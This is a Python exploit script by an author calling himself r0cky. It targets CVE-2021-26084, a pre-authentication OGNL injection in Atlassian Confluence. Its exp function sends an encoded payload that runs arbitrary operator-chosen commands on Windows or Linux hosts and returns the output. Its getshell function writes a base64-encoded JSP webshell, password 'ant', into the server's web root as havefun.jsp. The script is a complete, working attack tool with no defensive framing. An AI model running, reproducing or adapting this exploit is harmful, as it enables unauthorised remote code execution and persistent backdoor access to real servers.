#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@Author: r0cky
@Time: 2021/9/1-15:10
"""
import argparse
import html
import re
import subprocess
import sys
import urllib
from urllib.parse import urlparse, urljoin, quote

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
===========================================================================
   _____             __ _                             _____   _____ ______ 
  / ____|           / _| |                           |  __ \ / ____|  ____|
 | |     ___  _ __ | |_| |_   _  ___ _ __   ___ ___  | |__) | |    | |__   
 | |    / _ \| '_ \|  _| | | | |/ _ \ '_ \ / __/ _ \ |  _  /| |    |  __|  
 | |___| (_) | | | | | | | |_| |  __/ | | | (_|  __/ | | \ \| |____| |____ 
  \_____\___/|_| |_|_| |_|\__,_|\___|_| |_|\___\___| |_|  \_\\_____|______|

   CVE-2021-26084                          Powered by r0cky Team ZionLab
===========================================================================
"""
def banner():
    print('-------------------------------------------------------------')
    print('[*] CVE-2021-26084 - Confluence Pre-Auth RCE OGNL injection')
    print('[*] https://github.com/r0ckysec')
    print('[*] Powered by r0cky')
    print('-------------------------------------------------------------\n')

def exp(url, cmd):
    data = "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var isWin=java.lang.System.getProperty(\\u0027os.name\\u0027).toLowerCase().contains(\\u0027win\\u0027);var p=new java.lang.ProcessBuilder;if(isWin){p.command([\\u0027cmd.exe\\u0027,\\u0027/c\\u0027,\\u0027"+cmd+"\\u0027]);}else{p.command([\\u0027/bin/bash\\u0027,\\u0027-c\\u0027,\\u0027"+cmd+"\\u0027]);}p.redirectErrorStream(true);var pc=p.start();org.apache.commons.io.IOUtils.toString(pc.getInputStream())\\u0022)}%2b\\u0027"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print("[<<] %s" % cmd)
    req = requests.post(url, data=data, headers=headers, verify=False)
    queryString = re.findall("value=\"{([\s\S]*)=null}\"", req.text)
    if queryString:
        print(html.unescape(queryString[0]))

def getshell(url):
    shell = "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZhLnV0aWwuemlwLioiJT4NCjwlIQ0KICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgew0KICAgIFUoQ2xhc3NMb2FkZXIgYykgew0KICAgICAgc3VwZXIoYyk7DQogICAgfQ0KICAgIHB1YmxpYyBDbGFzcyBnKGJ5dGVbXSBiKSB7DQogICAgICByZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoYiwgMCwgYi5sZW5ndGgpOw0KICAgIH0NCiAgfQ0KICBwdWJsaWMgYnl0ZVtdIGRlY29tcHJlc3MoYnl0ZVtdIGRhdGEpIHsNCiAgICBieXRlW10gb3V0cHV0ID0gbmV3IGJ5dGVbMF07DQogICAgSW5mbGF0ZXIgZGMgPSBuZXcgSW5mbGF0ZXIoKTsNCiAgICBkYy5yZXNldCgpOw0KICAgIGRjLnNldElucHV0KGRhdGEpOw0KICAgIEJ5dGVBcnJheU91dHB1dFN0cmVhbSBvID0gbmV3IEJ5dGVBcnJheU91dHB1dFN0cmVhbShkYXRhLmxlbmd0aCk7DQogICAgdHJ5IHsNCiAgICAgIGJ5dGVbXSBidWYgPSBuZXcgYnl0ZVsxMDI0XTsNCiAgICAgIHdoaWxlICghZGMuZmluaXNoZWQoKSkgew0KICAgICAgICBpbnQgaSA9IGRjLmluZmxhdGUoYnVmKTsNCiAgICAgICAgby53cml0ZShidWYsIDAsIGkpOw0KICAgICAgfQ0KICAgICAgb3V0cHV0ID0gby50b0J5dGVBcnJheSgpOw0KICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7DQogICAgICAgIG91dHB1dCA9IGRhdGE7DQogICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7DQogICAgfSBmaW5hbGx5IHsNCiAgICAgIHRyeSB7DQogICAgICAgICAgby5jbG9zZSgpOw0KICAgICAgfSBjYXRjaCAoSU9FeGNlcHRpb24gZSkgew0KICAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7DQogICAgICB9DQogICAgfQ0KICAgIGRjLmVuZCgpOw0KICAgIHJldHVybiBvdXRwdXQ7DQogIH0NCiAgcHVibGljIGJ5dGVbXSBiYXNlNjREZWNvZGUoU3RyaW5nIHN0cikgdGhyb3dzIEV4Y2VwdGlvbiB7DQogICAgdHJ5IHsNCiAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOw0KICAgICAgcmV0dXJuIChieXRlW10pIGNsYXp6LmdldE1ldGhvZCgiZGVjb2RlQnVmZmVyIiwgU3RyaW5nLmNsYXNzKS5pbnZva2UoY2xhenoubmV3SW5zdGFuY2UoKSwgc3RyKTsNCiAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgew0KICAgICAgQ2xhc3MgY2xhenogPSBDbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7DQogICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsNCiAgICAgIHJldHVybiAoYnl0ZVtdKSBkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGUiLCBTdHJpbmcuY2xhc3MpLmludm9rZShkZWNvZGVyLCBzdHIpOw0KICAgIH0NCiAgfQ0KJT4NCjwlDQogIFN0cmluZyBjbHMgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigiYW50Iik7DQogIGlmIChjbHMgIT0gbnVsbCkgew0KICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGRlY29tcHJlc3MoYmFzZTY0RGVjb2RlKGNscykpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7DQogIH0NCiU+"
    data = "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var b64Shell=\\u0027"+quote(shell)+"\\u0027;var shell=new java.lang.String(java.util.Base64.getDecoder().decode(b64Shell));var f=new java.io.FileOutputStream(new java.io.File(\\u0027../confluence/havefun.jsp\\u0027));f.write(shell.getBytes());f.close();\\u0022)}%2b\\u0027"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    shellPath = urljoin(args.url, "/havefun.jsp")
    req = requests.post(url, data=data, headers=headers, verify=False)

    if req.text.find("value=\"{null=null}\""):
        req1 = requests.get(shellPath, headers=headers, verify=False)
        if req1.status_code == 200:
            print("[Shell] >> %s pass: ant" % shellPath)


if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser(description="CVE-2021-26084 - Confluence Pre-Auth RCE OGNL injection")
    parser.add_argument('--url', '-u', required=True, type=str, help='Target Url')
    parser.add_argument('--cmd', '-c', type=str, default="whoami", help='Command')
    parser.add_argument('--shell', action="store_true", help='Get shell')
    args = parser.parse_args()

    url = urljoin(args.url, "/pages/doenterpagevariables.action")

    if not args.shell:
        exp(url, args.cmd)
    else:
        getshell(url)
        # while (1):
        #     command = input("r0cky@shell$ ")
        #     if command == 'exit' or command == 'quit':
        #         break
        #     else:
        #         exp(url, command)